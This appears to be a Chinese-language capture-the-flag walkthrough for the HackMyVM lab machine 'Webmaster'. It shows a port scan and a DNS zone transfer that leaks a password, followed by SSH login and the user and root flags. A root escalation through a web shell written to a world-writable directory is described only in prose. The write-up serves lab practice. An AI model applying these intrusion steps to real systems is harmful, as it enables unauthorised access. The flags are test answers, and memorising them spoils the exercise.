# Webmaster

2024-11-06 https://hackmyvm.eu/machines/machine.php?vm=Webmaster

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

先访问 80 web 服务首页，图片中提示了密码放在了 txt 中，对 web 进行扫描，后缀增加 .txt ，用了大字典扫描，但是没找到可利用点。查看其源码发现有一个域名的提示：webmaster.hmv 将其添加到 /etc/host 文件中，再次访问 http://webmaster.hmv 显示的内容一致。

注意到这个服务器提供了 53 dns 服务，dig 查询下这个域名看是否有隐藏的信息，查看其 txt 记录，没有发现隐藏信息，查询是否有区域传输漏洞，发现重要信息：

```
dig @192.168.5.40 webmaster.hmv axfr

webmaster.hmv.		604800	IN	SOA	ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
webmaster.hmv.		604800	IN	NS	ns1.webmaster.hmv.
ftp.webmaster.hmv.	604800	IN	CNAME	www.webmaster.hmv.
john.webmaster.hmv.	604800	IN	TXT	"Myhiddenpazzword"
mail.webmaster.hmv.	604800	IN	A	192.168.0.12
ns1.webmaster.hmv.	604800	IN	A	127.0.0.1
www.webmaster.hmv.	604800	IN	A	192.168.0.11
webmaster.hmv.		604800	IN	SOA	ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
```

发现 TXT 中的提示像是密码 Myhiddenpazzword，同时发现子域名为 john.webmaster.hmv 那么很有可能 john 就是用户名，尝试 john/Myhiddenpazzword ssh 登陆成功。

获得了 user flag：

```
john@webmaster:~$ cat user.txt
HMVdnsyo
```

sudo -l 发现 (ALL : ALL) NOPASSWD: /usr/sbin/nginx 但是没办法进行利用，继续看 /var/www/ 发现 html 目录有 777 权限，可以直接写入一个 web shell 到此目录中，然后通过 curl 进行访问，得到了 root 权限的反弹 shell，最终得到了 root flag：

```
root@webmaster:/# cd /root
cd /root
root@webmaster:~# cat root.txt
cat root.txt
HMVnginxpwnd
```
